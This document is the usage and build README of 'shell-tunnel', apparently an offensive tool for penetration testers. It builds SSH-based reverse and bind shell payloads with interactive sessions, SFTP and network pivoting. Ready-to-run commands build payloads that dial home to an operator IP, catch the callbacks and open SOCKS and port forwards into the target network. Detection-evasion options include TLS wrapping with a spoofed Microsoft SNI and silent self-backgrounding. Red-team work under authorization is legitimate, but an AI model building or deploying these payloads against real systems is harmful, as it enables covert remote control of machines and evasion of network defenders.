# shell-tunnel Usage, Build Options & Known Issues

`shell-tunnel` is a single static SSH server binary for bind and reverse shells, full PTY sessions, SFTP file transfer, and SSH port forwarding using a plain `ssh` client on the operator side. Credentials and connection details are baked in at build time via Go ldflags, with optional TLS wrapping to hide the SSH banner inside TLS traffic.

This repository is the preservation fork of [Ferdinor's undertow](https://github.com/Ferdinor) (2021), whose upstream repository is no longer public — same GPLv3, modernized and maintained with current dependencies (the 2021 `x/crypto` pin had known SSH vulnerabilities), CI on every commit, and tagged releases with six prebuilt binaries. For authorized security testing with explicit written permission only.

## What's in it

| Piece | Does |
|---|---|
| `reverse` | Binary dials home through egress firewalls and retries every 5 s until the listener answers; you SSH to the bind it sets up on your box (random port by default, `-b` pins it) |
| `listen` | Binary listens on the target; you SSH straight to it |
| PTY | openpty on Linux, ConPTY on Windows 10 17763+ — tab completion, job control, full-screen tools; terminal resizes follow your window, and bash-less targets fall back to `/bin/sh` |
| SFTP | Built-in subsystem on the same connection — `sftp -P 4444 svc@127.0.0.1` |
| Forwarding | Local (`-L`), remote (`-R`) and dynamic SOCKS (`-D`) through the stock ssh client; the session is the pivot |
| `--tls` | Wraps SSH in TLS with ALPN and a spoofed SNI (default `www.microsoft.com`) so the banner never crosses the wire in plaintext |
| `--nocli` | Bakes a flagless payload; with `--daemonize` it also backgrounds itself on launch (frees evil-winrm-style sessions) |

`./build.sh` cross-compiles Linux and Windows binaries with a fresh random password baked in (`-p` pins one, `-k` bakes an ED25519 authorized key instead), and writes a handler script for reverse mode that starts the listener and shows the password. Every status line starts with a bracketed tag — `[ok]`, `[!]`, `[x]`, `[i]` — so output stays meaningful piped or with `NO_COLOR` set.

When a callback lands, the listener numbers it (`Session 1: …`) and prints two titled commands with a blank line between the steps. The first starts a ControlMaster — `ssh -fNM -S /tmp/shell-tunnel-<port>.sock …` with `UserKnownHostsFile=/dev/null`, `StrictHostKeyChecking=no`, `ServerAliveInterval=60`, `ServerAliveCountMax=10` and `ExitOnForwardFailure=yes` — so a dropped VPN only ends the session after ten straight minutes of silence — and the second opens the PTY over that socket. SFTP and `-L`/`-R`/`-D` forwards then share the one authenticated connection, and the per-run host key never touches `~/.ssh/known_hosts`. Dial-home also sends `keepalive@openssh.com` every 15 s so NAT idle timeouts don't eat a parked callback. Inside the session, ssh's escape keys work as always: `~^Z` backgrounds it, `~#` lists forwarded connections, `~.` closes it.

## Build & usage examples

### Reverse mode (dials home)

```sh
# Build Linux and Windows payloads + local handler script (random password and bind port)
./build.sh reverse 10.10.14.5:4444

# Start the generated handler on the operator machine
./bin/handler-10-10-14-5-4444

# Wrap SSH in TLS with a custom SNI, disable runtime flags, and self-background on launch
./build.sh reverse 10.10.14.5:443 --tls --sni login.microsoft.com --nocli --daemonize

# Pin a bind port and authenticate with an ED25519 public key
./build.sh reverse 10.10.14.5:4444 -b 41827 -k ~/.ssh/id_ed25519.pub

# Preview the Make command and output names without compiling
./build.sh reverse 10.10.14.5:4444 --dry-run
```

### Bind mode (listens on target)

```sh
# Build a bind-shell binary listening on port 8888
./build.sh listen 8888

# Override the default shell and pin a password
./build.sh listen 8888 -s /bin/sh -p "engagement-secret"
```

### Connecting, SFTP, and port forwarding

Once a reverse callback lands (for example on allocated loopback port `41827`), run the two commands printed by the handler, then reuse the ControlMaster socket for SFTP and pivots:

```sh
# 1. Start the ControlMaster socket once
ssh -fNM -S /tmp/shell-tunnel-41827.sock -p 41827 svc@127.0.0.1 \
  -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no \
  -o ServerAliveInterval=60 -o ServerAliveCountMax=10 -o ExitOnForwardFailure=yes

# 2. Open an interactive PTY shell over that socket
ssh -S /tmp/shell-tunnel-41827.sock -p 41827 svc@127.0.0.1

# Reuse the same socket for SFTP or local/remote/SOCKS forwarding
sftp -o ControlPath=/tmp/shell-tunnel-41827.sock -P 41827 svc@127.0.0.1
ssh -S /tmp/shell-tunnel-41827.sock -O forward -D 1080 -p 41827 svc@127.0.0.1
ssh -S /tmp/shell-tunnel-41827.sock -O forward -L 8443:10.10.10.50:443 -p 41827 svc@127.0.0.1
```

### Runtime flags (when built without `--nocli`)

```sh
# Bind listener with verbose status output
./shell-tunnel -v -l -p 4444

# Reverse dial-home with explicit user, port, and random remote bind port
./shell-tunnel -v -p 4444 -b 0 svc@10.10.14.5

# Detach into background on launch; deny shell/SFTP/local forwards (-N) when catching callbacks
./shell-tunnel -l -N -v -p 4444
./shell-tunnel -d 10.10.14.5
```

## Configuration

- `./build.sh <mode> <target> [options]` — see `./build.sh --help`; every build knob ends up as an ldflags variable, so the [Makefile](../Makefile) works directly too:

| Build option (`./build.sh`) | `Makefile` ldflags variable | Default | Purpose |
|---|---|---|---|
| `reverse <host>:<port>` | `LHOST` / `LPORT` | `""` / `31337` | Listener host and port for dial-home mode (empty `LHOST` enters listen mode) |
| `-u`, `--user` | `LUSER` | `svc` | Username used when dialling home and printed in connect commands |
| `-b`, `--bind-port` | `BPORT` | `0` | Reverse loopback bind port on the listener (`0` allocates a random port) |
| `-p`, `--password` | `RS_PASS` | random 16-hex | Password baked into the binary (constant-time compared) |
| `-k`, `--pubkey` | `RS_PUB` | `""` | Authorized SSH public key baked into the binary |
| `-s`, `--shell` | `RS_SHELL` | `/bin/bash` | Default shell on Unix, or `ssh-shellhost.exe` path on pre-ConPTY Windows |
| `--nocli` | `NOCLI` | `""` | Disable runtime CLI parsing; run purely from baked-in settings |
| `--daemonize` | `DAEMONIZE` | `""` | Auto-detach into the background on launch |
| `--tls` | `TLS_WRAP` | `""` | Wrap SSH traffic inside TLS (`h2`, `http/1.1` ALPN) |
| `--sni` | `TLS_SNI` | `www.microsoft.com` | SNI hostname sent in the TLS ClientHello |

- `-V` / `--version` — print `shell-tunnel vX.Y.Z` and exit `0`
- `NO_COLOR` — plain output from the build script and the binary (also automatic when `TERM=dumb` or stdout is not a TTY)

## Tested on

- 18 in-process integration tests run the real server on loopback (one, the shell fallback, is unix-only): password and pubkey auth (accept and reject), exec with exit status, PTY shell, SFTP round trip, direct-tcpip and remote forwarding, the rs-info channel, the full dial-home reverse flow and a late-listener retry — on every commit in CI and on the Windows build host
- Windows 11 · Go 1.27 — build host; gofmt, `go vet`, clean builds for all six targets
- ubuntu-24.04, windows-2022, macos-latest · CI builds amd64 and arm64 on every commit
- *Not* run: macOS at runtime — cross-compiled on every release, unsigned; first run needs `xattr -d com.apple.quarantine`

## Known issues

- The dial-home side uses `InsecureIgnoreHostKey`: a payload can't pin a host key it has never seen. Verify the callback out of band — the handler shows the connecting address and the rs-info line names the user and host.
- Only the initial dial retries. An established callback that drops later is not redialled; run the payload again.
- TLS wrapping presents a self-signed certificate generated at runtime. It hides the SSH banner from DPI; it does not authenticate the listener to the payload.
- Baked credentials live in the binary. Build per engagement, and keep the handler scripts to yourself — they print the password and are written `chmod 700` for a reason.
- Windows targets older than Windows 10 17763 have no ConPTY; use `-s ssh-shellhost.exe`, or append `cmd` to the ssh line for a non-PTY session.
- Nothing is signed. The Windows SmartScreen and macOS Gatekeeper warnings on first run are expected; `SHA256SUMS.txt` comes from the same release as the binaries it checks.
